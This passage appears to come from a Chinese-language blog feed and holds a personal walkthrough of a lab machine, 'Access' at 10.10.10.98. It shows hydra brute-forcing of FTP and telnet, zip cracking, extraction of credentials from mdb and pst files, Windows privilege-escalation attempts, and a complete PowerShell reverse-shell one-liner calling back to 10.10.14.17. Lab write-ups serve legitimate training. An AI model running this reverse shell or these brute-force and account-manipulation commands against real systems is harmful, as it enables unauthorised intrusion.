class="hljs-number">500</span>-worst-passwords.txt <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span> ftp<br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: <span class="hljs-number">123456</span><br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: <span class="hljs-keyword">password</span><br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: <span class="hljs-number">12345678</span><br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: <span class="hljs-number">1234</span><br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: pussy<br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: <span class="hljs-number">12345</span><br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: qwerty<br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: <span class="hljs-number">696969</span><br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: mustang<br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: letmein<br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: baseball<br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: master<br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: michael<br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: dragon<br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: football<br>[<span class="hljs-number">21</span>][ftp] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>   <span class="hljs-keyword">login</span>: ftp   <span class="hljs-keyword">password</span>: shadow<br></code></pre></div></td></tr></table></figure><p>apt install filezilla<br>图形界面ftp登陆失败。</p><h4 id="mdb查看工具"><a href="#mdb查看工具" class="headerlink" title="mdb查看工具"></a>mdb查看工具</h4><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">下载查看mdb文件的工具<br>sudo apt-<span class="hljs-keyword">get</span> install mdbtools mdbtools-gmdb mdbtools-dev<br><br>mdb-<span class="hljs-keyword">tables</span> backup.mdb 查看该数据库的表<br>提示段错误<br><span class="hljs-keyword">offset</span> <span class="hljs-number">7585302654976</span> <span class="hljs-keyword">is</span> beyond EOF<br>Segmentation fault<br></code></pre></div></td></tr></table></figure><h4 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h4><p><code>cd /usr/share/wordlists/ &amp;&amp; fcrackzip -D -p long-pass-rockyou.txt -u /root/Desktop/98/a.zip</code><br>破解失败</p><h2 id="23"><a href="#23" class="headerlink" title="23"></a>23</h2><figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">Trying <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>...<br>Connected <span class="hljs-keyword">to</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>.<br>Escape <span class="hljs-built_in">character</span> <span class="hljs-keyword">is</span> &#x27;^]&#x27;.<br><br>Welcome <span class="hljs-keyword">to</span> Microsoft Telnet Service <br><br></code></pre></div></td></tr></table></figure><p><code>hydra -L /root/Desktop/86/user.txt -P /usr/share/wordlists/500-worst-passwords.txt 10.10.10.98 telnet</code></p><p>MS15-002 telnet服务缓冲区溢出漏洞分析与POC构造</p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>除了一张图片没有检查出任何东西</p><hr><p>线索断了，获取到的zip破解不了密码，获取到的数据库找不到关键信息。</p><p>ms15-034 http.sys </p><p>msf成功读取服务器内存，但好像没什么用，都是乱码</p><hr><p>参考资料：<a href="https://www.reddit.com/r/linux/comments/4syuw5/working_with_a_pst_file_in_linux/">https://www.reddit.com/r/linux/comments/4syuw5/working_with_a_pst_file_in_linux/</a><br><a href="https://www.youtube.com/watch?v=8B8cs_KkmfQ">https://www.youtube.com/watch?v=8B8cs_KkmfQ</a><br><a href="http://theevilbit.blogspot.com/2013/01/backtrack-forensics-convert-pst-mail.html">http://theevilbit.blogspot.com/2013/01/backtrack-forensics-convert-pst-mail.html</a></p><p>attack vector<br>在mdb数据库中，用mdb-tools搜索user</p><h2 id="获得一个口令"><a href="#获得一个口令" class="headerlink" title="获得一个口令"></a>获得一个口令</h2><p>access4u@security，用该口令解开zip文件。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-11/5.PNG" alt="5"></p><p>下载evolution，准备打开pst文件</p><p>sudo apt-get install evolution evolution-plugins</p><p>Access Control.pst</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">readpst <span class="hljs-keyword">Access</span>\ Control.pst   pst格式转换，生成了mbox文件<br>mail -f <span class="hljs-keyword">Access</span>\ Control 查看mbox文件<br><span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-11/6.PNG" alt="6"></p><h2 id="获取一个shell"><a href="#获取一个shell" class="headerlink" title="获取一个shell"></a>获取一个shell</h2><p>security/4Cc3ssC0ntr0ller</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-11/7.PNG" alt="7"></p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">C:\Users\<span class="hljs-keyword">security</span>\Desktop&gt;<span class="hljs-keyword">type</span> <span class="hljs-keyword">user</span>.txt<br>ff1f3b48913b213a31ff6756d2553d38<br><br><br>net <span class="hljs-keyword">user</span><br><br><span class="hljs-keyword">User</span> accounts <span class="hljs-keyword">for</span> \\<span class="hljs-keyword">ACCESS</span><br><br><span class="hljs-comment">-------------------------------------------------------------------------------</span><br>Administrator            engineer                 Guest                    <br><span class="hljs-keyword">security</span>                 <br>The command completed successfully.<br></code></pre></div></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>参考资料：<a href="https://www.cnblogs.com/hack0ne/p/4592536.html">https://www.cnblogs.com/hack0ne/p/4592536.html</a></p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">C:\Users\security&gt;type t.bat<br>powershell -executionpolicy bypass C:\Users\<span class="hljs-keyword">Public</span>\s2.ps1<br><br><br> Directory of C:\<br><br><span class="hljs-number">08</span><span class="hljs-regexp">/23/</span><span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">05</span> PM    &lt;DIR&gt;          inetpub<br><span class="hljs-number">07</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2009</span>  <span class="hljs-number">03</span>:<span class="hljs-number">20</span> AM    &lt;DIR&gt;          PerfLogs<br><span class="hljs-number">08</span><span class="hljs-regexp">/23/</span><span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">53</span> PM    &lt;DIR&gt;          Program Files<br><span class="hljs-number">08</span><span class="hljs-regexp">/24/</span><span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">40</span> PM    &lt;DIR&gt;          Program Files (x86)<br><span class="hljs-number">08</span><span class="hljs-regexp">/24/</span><span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">39</span> PM    &lt;DIR&gt;          temp<br><span class="hljs-number">01</span><span class="hljs-regexp">/07/</span><span class="hljs-number">2019</span>  <span class="hljs-number">08</span>:<span class="hljs-number">50</span> PM    &lt;DIR&gt;          Users<br><span class="hljs-number">08</span><span class="hljs-regexp">/23/</span><span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">40</span> PM    &lt;DIR&gt;          Windows<br><span class="hljs-number">08</span><span class="hljs-regexp">/22/</span><span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">23</span> AM    &lt;DIR&gt;          ZKTeco<br>               <span class="hljs-number">0</span> <span class="hljs-keyword">File</span>(s)              <span class="hljs-number">0</span> bytes<br>cd ZKTeco/ZKAccess3.<span class="hljs-number">5</span> 有很多access数据库文件<br><br>cd inetpub<br><br>C:\inetpub&gt;dir<br><br> Volume in drive C has no label.<br><br> Volume Serial Number is <span class="hljs-number">9</span>C45-DBF0<br><br><br><br> Directory of C:\inetpub<br><br><br><br><span class="hljs-number">08</span><span class="hljs-regexp">/23/</span><span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">05</span> PM    &lt;DIR&gt;          .<br><br><span class="hljs-number">08</span><span class="hljs-regexp">/23/</span><span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">05</span> PM    &lt;DIR&gt;          ..<br><br><span class="hljs-number">08</span><span class="hljs-regexp">/21/</span><span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">55</span> PM    &lt;DIR&gt;          custerr<br><br><span class="hljs-number">08</span><span class="hljs-regexp">/23/</span><span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">50</span> PM    &lt;DIR&gt;          ftproot<br><br><span class="hljs-number">08</span><span class="hljs-regexp">/24/</span><span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">22</span> PM    &lt;DIR&gt;          history<br><br><span class="hljs-number">08</span><span class="hljs-regexp">/21/</span><span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">55</span> PM    &lt;DIR&gt;          logs<br><br><span class="hljs-number">08</span><span class="hljs-regexp">/21/</span><span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">55</span> PM    &lt;DIR&gt;          temp<br><br><span class="hljs-number">08</span><span class="hljs-regexp">/24/</span><span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">39</span> PM    &lt;DIR&gt;          wwwroot<br><br>               <span class="hljs-number">0</span> <span class="hljs-keyword">File</span>(s)              <span class="hljs-number">0</span> bytes<br><br>               <span class="hljs-number">8</span> Dir(s)  <span class="hljs-number">16</span>,<span class="hljs-number">620</span>,<span class="hljs-number">236</span>,<span class="hljs-number">800</span> bytes free<br><br><br><br>输入命令systeminfo<br><br>Host Name:                 ACCESS<br>OS Name:                   Microsoft Windows Server <span class="hljs-number">2008</span> R2 Standard <br>OS Version:                <span class="hljs-number">6.1</span>.<span class="hljs-number">7600</span> N/A Build <span class="hljs-number">7600</span><br>OS Manufacturer:           Microsoft Corporation<br>OS Configuration:          Standalone Server<br>OS Build Type:             Multiprocessor Free<br>Registered Owner:          Windows User<br>Registered Organization:   <br>Product ID:                <span class="hljs-number">55041</span>-<span class="hljs-number">507</span>-<span class="hljs-number">9857321</span>-<span class="hljs-number">84191</span><br>Original Install Date:     <span class="hljs-number">8</span><span class="hljs-regexp">/21/</span><span class="hljs-number">2018</span>, <span class="hljs-number">9</span>:<span class="hljs-number">43</span>:<span class="hljs-number">10</span> PM<br>System Boot Time:          <span class="hljs-number">1</span><span class="hljs-regexp">/7/</span><span class="hljs-number">2019</span>, <span class="hljs-number">8</span>:<span class="hljs-number">14</span>:<span class="hljs-number">54</span> AM<br>System Manufacturer:       VMware, Inc.<br>System Model:              VMware Virtual Platform<br>System Type:               x64-based PC<br><br></code></pre></div></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">net</span> <span class="hljs-string">user</span> <span class="hljs-string">whale</span> <span class="hljs-string">/add</span>  <span class="hljs-string">添加用户，权限不够</span><br><span class="hljs-string">提示：System</span> <span class="hljs-string">error</span> <span class="hljs-number">5</span> <span class="hljs-string">has</span> <span class="hljs-string">occurred.</span><br><span class="hljs-string">Access</span> <span class="hljs-string">is</span> <span class="hljs-string">denied.</span><br><br><span class="hljs-string">net</span> <span class="hljs-string">localgroup</span><br><span class="hljs-string">Aliases</span> <span class="hljs-string">for</span> <span class="hljs-string">\\ACCESS</span><br><br><span class="hljs-string">-------------------------------------------------------------------------------</span><br><span class="hljs-meta">*Administrators</span><br><span class="hljs-string">*Backup</span> <span class="hljs-string">Operators</span><br><span class="hljs-string">*Certificate</span> <span class="hljs-string">Service</span> <span class="hljs-string">DCOM</span> <span class="hljs-string">Access</span><br><span class="hljs-string">*Cryptographic</span> <span class="hljs-string">Operators</span><br><span class="hljs-string">*Distributed</span> <span class="hljs-string">COM</span> <span class="hljs-string">Users</span><br><span class="hljs-string">*Event</span> <span class="hljs-string">Log</span> <span class="hljs-string">Readers</span><br><span class="hljs-meta">*Guests</span><br><span class="hljs-meta">*IIS_IUSRS</span><br><span class="hljs-string">*Network</span> <span class="hljs-string">Configuration</span> <span class="hljs-string">Operators</span><br><span class="hljs-string">*Performance</span> <span class="hljs-string">Log</span> <span class="hljs-string">Users</span><br><span class="hljs-string">*Performance</span> <span class="hljs-string">Monitor</span> <span class="hljs-string">Users</span><br><span class="hljs-string">*Power</span> <span class="hljs-string">Users</span><br><span class="hljs-string">*Print</span> <span class="hljs-string">Operators</span><br><span class="hljs-string">*Remote</span> <span class="hljs-string">Desktop</span> <span class="hljs-string">Users</span><br><span class="hljs-meta">*Replicator</span><br><span class="hljs-meta">*TelnetClients</span><br><span class="hljs-meta">*Users</span><br><span class="hljs-string">The</span> <span class="hljs-string">command</span> <span class="hljs-string">completed</span> <span class="hljs-string">successfully.</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">net</span> <span class="hljs-string">localgroup</span> <span class="hljs-string">TelnetClients</span><br><span class="hljs-string">security</span>   <span class="hljs-string">说明只有security用户能够用telnet登陆</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">net</span> <span class="hljs-string">localgroup</span> <span class="hljs-string">Users</span><br><span class="hljs-string">Administrator</span><br><span class="hljs-string">engineer</span><br><span class="hljs-string">NT</span> <span class="hljs-string">AUTHORITY\Authenticated</span> <span class="hljs-string">Users</span><br><span class="hljs-string">NT</span> <span class="hljs-string">AUTHORITY\INTERACTIVE</span><br><span class="hljs-string">security</span><br><span class="hljs-string">The</span> <span class="hljs-string">command</span> <span class="hljs-string">completed</span> <span class="hljs-string">successfully.</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">net</span> <span class="hljs-string">localgroup</span> <span class="hljs-string">Administrators</span> <span class="hljs-string">查看管理员组</span><br><span class="hljs-string">Alias</span> <span class="hljs-string">name</span>     <span class="hljs-string">Administrators</span><br><span class="hljs-string">Comment</span>        <span class="hljs-string">Administrators</span> <span class="hljs-string">have</span> <span class="hljs-string">complete</span> <span class="hljs-string">and</span> <span class="hljs-string">unrestricted</span> <span class="hljs-string">access</span> <span class="hljs-string">to</span> <span class="hljs-string">the</span> <span class="hljs-string">computer/domain</span><br><br><span class="hljs-string">Members</span><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">REG</span> <span class="hljs-string">ADD</span> <span class="hljs-string">HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot;</span> <span class="hljs-string">&quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 尝试开启3389，失败</span><br><span class="hljs-string">---</span><br><span class="hljs-string"></span><br><span class="hljs-string">runas /user:engineer cmd</span><br><span class="hljs-string">access4u@security</span><br><span class="hljs-string"></span><br><span class="hljs-string">runas /user:Administrator cmd</span><br><span class="hljs-string">123456</span><br><span class="hljs-string">没有任何提示，例如&quot;</span><span class="hljs-string">The</span> <span class="hljs-string">command</span> <span class="hljs-string">completed</span> <span class="hljs-string">successfully.&quot;，应该失败了</span><br><span class="hljs-string">查了一下，cmd只能注销用户再以其他用户登陆</span><br><span class="hljs-string">-------------------------------------------------------------------------------</span><br><span class="hljs-string">Administrator</span><br><span class="hljs-string">The</span> <span class="hljs-string">command</span> <span class="hljs-string">completed</span> <span class="hljs-string">successfully.</span><br><br><span class="hljs-string">net</span> <span class="hljs-string">localgroup</span> <span class="hljs-string">Administrators</span> <span class="hljs-string">security</span> <span class="hljs-string">/add</span>  <span class="hljs-string">尝试将本用户加入管理员组，失败。</span><br><br><span class="hljs-string">net</span> <span class="hljs-string">localgroup</span> <span class="hljs-string">&quot;Remote Desktop Users&quot;</span><br><span class="hljs-string">net</span> <span class="hljs-string">localgroup</span> <span class="hljs-string">&quot;Remote Desktop Users&quot;</span> <span class="hljs-string">security</span> <span class="hljs-string">/add</span>   <span class="hljs-string">尝试加入远程桌面用户组</span><br><br></code></pre></div></td></tr></table></figure><h2 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h2><p>web路径发现一个目录，浏览器访问以及telnet访问无权限。于是google一下。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\inetpub&gt;cd wwwroot<br><br><span class="hljs-attribute">C</span>:\inetpub\wwwroot&gt;dir<br> <span class="hljs-attribute">Volume</span> in dri<br><br> <span class="hljs-attribute">C</span> has no label.<br> <span class="hljs-attribute">Volume</span> Serial Number is <span class="hljs-number">9</span>C<span class="hljs-number">45</span>-DBF<span class="hljs-number">0</span><br><br> <span class="hljs-attribute">Directory</span> of C:\inetpub\wwwroot<br><br><span class="hljs-attribute">08</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">39</span> PM    &lt;DIR&gt;          .<br><span class="hljs-attribute">08</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">39</span> PM    &lt;DIR&gt;          ..<br><span class="hljs-attribute">08</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">30</span> PM    &lt;DIR&gt;          aspnet_client<br><span class="hljs-attribute">08</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">11</span>:<span class="hljs-number">33</span> PM               <span class="hljs-number">391</span> index.html<br><span class="hljs-attribute">08</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">39</span> PM            <span class="hljs-number">88</span>,<span class="hljs-number">712</span> out.jpg<br>               <span class="hljs-attribute">2</span> File(s)         <span class="hljs-number">89</span>,<span class="hljs-number">103</span> bytes<br>               <span class="hljs-attribute">3</span> Dir(s)  <span class="hljs-number">16</span>,<span class="hljs-number">623</span>,<span class="hljs-number">439</span>,<span class="hljs-number">872</span> bytes free<br><br><span class="hljs-attribute">cd</span> aspnet_client<br></code></pre></div></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.98</span>/aspnet_client/system_web/<br><br><span class="hljs-number">403</span> - Forbidden: Access is denied.<br>You <span class="hljs-built_in">do</span> <span class="hljs-keyword">not</span> have permission <span class="hljs-built_in">to</span> view this <span class="hljs-built_in">directory</span> <span class="hljs-keyword">or</span> page <span class="hljs-keyword">using</span> <span class="hljs-keyword">the</span> credentials that you supplied.<br></code></pre></div></td></tr></table></figure><p>IIS 7.5源代码披露/身份验证绕过<br><a href="https://blog.alertlogic.com/blog/internet-information-server-(iis)-exploitation/">https://blog.alertlogic.com/blog/internet-information-server-(iis)-exploitation/</a></p><h2 id="尝试2，powershell反弹shell"><a href="#尝试2，powershell反弹shell" class="headerlink" title="尝试2，powershell反弹shell"></a>尝试2，powershell反弹shell</h2><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">nc <span class="hljs-literal">-lnvp</span> <span class="hljs-number">6688</span><br><br><span class="hljs-built_in">copy</span> con whale.ps1<br><br><span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&#x27;10.10.14.17&#x27;</span>,<span class="hljs-number">6688</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> );<span class="hljs-variable">$sendback2</span>  = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&#x27;PS &#x27;</span> + (<span class="hljs-built_in">pwd</span>).Path + <span class="hljs-string">&#x27;&gt; &#x27;</span>;<span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()<br><br>Yes<br><br><span class="hljs-built_in">type</span> whale.ps1<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-11/8.PNG" alt="8"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>下回学下windows，没有msf怎么手动提权。windows提权做的比较少。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>windows</tag>
      
      <tag>port 23</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Devel（ftp匿名登陆可读可写）</title>
    <link href="/2019/01/10/x/"/>
    <url>/2019/01/10/x/</url>
    
